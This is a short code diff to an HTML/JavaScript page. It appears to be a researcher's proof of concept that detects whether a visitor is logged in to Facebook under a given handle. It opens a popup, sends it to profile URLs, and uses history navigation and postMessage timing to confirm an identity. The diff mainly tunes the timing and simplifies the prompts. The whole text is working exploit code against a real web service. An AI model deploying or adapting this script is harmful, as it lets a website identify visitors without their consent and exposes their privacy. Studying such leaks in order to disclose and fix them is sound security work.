@@ -15,7 +15,7 @@ window.onmessage=function(e){
   }
 }
 https = confirm('Do you have "https" in your profile URL? Cancel = NO, OK = YES')
-timeout = parseInt(prompt('Timeout for your network? Recommended 9000 - 9 seconds'));
+timeout = 9000// parseInt(prompt('Timeout for your network? Recommended 9000 - 9 seconds'));
 
 if(https){
   base='https://www.facebook.com'
@@ -25,7 +25,7 @@ if(https){
 
 await = false;
 exact = false;
-handles = prompt('Type a list of handles, space separated(sdjo 234234 adsf egor.homakov ewrewqe)').split(' ')
+handles = prompt('Your handle: (e.g. egor.homakov )').split(' ')
 
 get_handle = function(){
   return handles.shift()
@@ -38,18 +38,24 @@ try_next = function(){
 
   next=base+'/'+handle+'#'
   console.log('Navigate to ',next)
-  x.location=(next)
+  x.location=next;
 
   setTimeout(function(){
+    x.history.back()
     exact = setTimeout(function(){
       alert('Yes you are '+handle)
     }, 300);
-    x.history.back()
-  },500)
+  },10)
 }
+
 x=window.open('data:text/html,<script>opener.postMessage("","*")<'+'/script>'); 
-setTimeout(function(){
+
+from_scratch=function(){
   x.location=(base+'/profile.php')
-  setTimeout(try_next,timeout)
-},500)
+  setTimeout(try_next, timeout)
+}
+
+setTimeout(from_scratch,1000)
+
+
 </script></body></html>
